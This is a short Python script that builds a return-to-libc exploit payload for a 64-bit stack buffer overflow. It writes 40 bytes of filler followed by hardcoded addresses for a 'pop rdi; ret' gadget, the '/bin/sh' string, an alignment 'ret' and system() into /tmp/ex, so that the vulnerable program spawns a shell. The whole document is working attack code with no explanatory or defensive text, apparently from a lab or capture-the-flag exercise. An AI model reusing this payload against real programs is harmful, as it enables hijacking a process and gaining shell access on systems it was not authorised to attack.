from struct import pack

filler = b"A"*40
poprdi = pack("<Q", 0x7ffff7e057e5) # pop rdi; ret
binsh  = pack("<Q", 0x7ffff7f74031) # /bin/sh
ret    = pack("<Q", 0x7ffff7e04e99) # ret
system = pack("<Q", 0x7ffff7e2a490) # system()

f = open("/tmp/ex", "wb")
f.write(filler+poprdi+binsh+ret+system+b"\n")
f.close()
